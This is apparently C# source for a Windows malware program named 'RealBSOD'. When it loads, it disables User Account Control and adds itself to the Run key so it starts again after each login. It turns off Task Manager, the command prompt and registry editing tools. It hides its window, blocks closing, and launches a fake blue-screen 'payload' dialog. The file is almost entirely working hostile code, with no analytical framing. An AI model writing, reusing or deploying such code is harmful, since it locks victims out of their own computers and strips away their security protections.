using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.Win32;

namespace RealBSOD
{
	public class Form1 : Form
	{
		private IContainer components = null;

		public Form1()
		{
			InitializeComponent();
			base.TransparencyKey = BackColor;
		}

		private void Form1_Load(object sender, EventArgs e)
		{
			RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
			RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			registryKey3.SetValue("RealBSOD", Application.ExecutablePath.ToString());
			RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey4.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
			RegistryKey registryKey5 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
			registryKey5.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
			RegistryKey registryKey6 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey6.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
			Hide();
			BSODPayload bSODPayload = new BSODPayload();
			bSODPayload.ShowDialog();
			Close();
		}

		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			base.SuspendLayout();
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new System.Drawing.Size(10, 10);
			base.ControlBox = false;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "Form1";
			base.Opacity = 0.01;
			base.ShowIcon = false;
			base.ShowInTaskbar = false;
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Form1";
			base.TopMost = true;
			base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(Form1_FormClosing);
			base.Load += new System.EventHandler(Form1_Load);
			base.ResumeLayout(false);
		}
	}
}
